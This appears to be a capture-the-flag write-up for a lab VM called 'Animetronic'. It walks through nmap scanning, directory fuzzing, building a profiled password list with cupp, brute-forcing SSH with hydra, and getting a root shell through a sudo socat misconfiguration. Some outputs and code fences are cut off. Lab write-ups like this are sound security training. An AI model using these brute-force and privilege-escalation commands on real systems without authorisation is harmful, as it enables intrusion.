Writeup for [[Maquinas]]

Let's start with an arpsweep to discover the targets IP address:

``` bash
sudo nmap -sn 192.168.56.100/24 -oN arpsweep.txt
```

Which results  as:

``` java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 18:47 CEST

```

Target is 56.110

Lets do a portscan:

``` bash
sudo nmap -sS -p- -T4 192.168.56.110 -oN portscan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 18:48 CEST

```

And now let's do the usual -A enumeration:

``` bash
sudo nmap -sS -p 22,80 -A 192.168.56.110 -oN servicescan.txt

When we visit the page we get a warning claiming that the service isn't working as the main factory suffered a fire.

The prompt is run again whenever we click the "Get Animetronic" button. The background image is of the FNAF Security Breach game.

Exiftool doesnt really show any useful info either on the background image or favicon.

Scanning nmap we see we could perhaps attempt bruteforcing an SSH password:

``` bash
sudo nmap -p 22 --script ssh-auth-methods 192.168.56.110

When fuzzing with different wordlists we find the /staffpages directory, if we fuzz under it new_employees using seclists Web-Content directory-medium-2.3.

Let's download it:

``` bash
wget http://192.168.56.110/staffpages/new_employees

So we know we have an user named michael and a base64 encoded page. If we translated with cyberchef, it's upside down characters saying message for michael.

``` bash
ɯǝssɐƃǝ‾ɟoɹ‾ɯıɔɥɐǝן
```

With:

``` bash
curl http://192.168.56.110
```

We get no response.

But under staffpages:

``` bash
curl http://192.168.56.110/staffpages/message_for_michael

Hi Michael

Sorry for this complicated way of sending messages between us.
This is because I assigned a powerful hacker to try to hack
our server.

By the way, try changing your password because it is easy
to discover, as it is a mixture of your personal information
contained in this file 

personal_info.txt
```

Now we know password info. Let's check the file:

``` bash
curl http://192.168.56.110/staffpages/personal_info.txt

name: Michael

age: 27

birth date: 19/10/1996

number of children: 3 " Ahmed - Yasser - Adam "

Hobbies: swimming   
```

This means that to bruteforce SSH we will need to generate a new custom dictionary for the attack:

``` bash
cupp -i

   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: michael
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 19101996


> Partners) name: 
> Partners) nickname: 
> Partners) birthdate (DDMMYYYY): 


> Child's name: Ahmed
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: 
> Company name: Animetronics


> Do you want to add some key words about the victim? Y/[N]: Y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: Yasser,Adam,swimming,27
> Do you want to add special chars at the end of words? Y/[N]: Y
> Do you want to add some random numbers at the end of words? Y/[N]:Y
> Leet mode? (i.e. leet = 1337) Y/[N]: Y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to michael.txt, counting 13214 words.
[+] Now load your pistolero with michael.txt and shoot! Good luck!
```

Now we can attack with hydra such as with:

``` bash
hydra -l michael -P michael.txt ssh://192.168.56.110
```

After a (considerably long) wait we get the password "leahcim1996"

So we get into SSH:

``` bash
ssh michael@192.168.56.110

[sudo] password for michael: 
Sorry, user michael may not run sudo on animetronic.
```


We explore briefly:

``` bash
michael@animetronic:~$ cat .bash_history 
exit
michael@animetronic:~$ cd ..
michael@animetronic:/home$ ls
henry  michael
michael@animetronic:/home$ cd henry/
michael@animetronic:/home/henry$ ls
Note.txt  user.txt
michael@animetronic:/home/henry$ cat Note.txt 
if you need my account to do anything on the server,
you will find my password in file named

michael@animetronic:/home/henry$ cat user.txt 
0833990328464efff1de6cd93067cfb7
```

Lets find that file (which is henrypassword.txt in b64 btw):

``` bash
find / -iname henrypassword.txt 2>/dev/null

cat /home/henry/.new_folder/dir289/dir26/dir10/henrypassword.txt

IHateWilliam
```

So:

``` bash
michael@animetronic:/home/henry$ su henry
Password: 
henry@animetronic:~$ sudo -l
Matching Defaults entries for henry on animetronic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User henry may run the following commands on animetronic:
    (root) NOPASSWD: /usr/bin/socat
```

We can run socat as root, so thanks to GTFObins:

``` bash
sudo socat stdin exec:/bin/sh
```

And there we are:

``` bash
henry@animetronic:~$ sudo socat stdin exec:/bin/sh
whoami
root
cat /root/root.txt
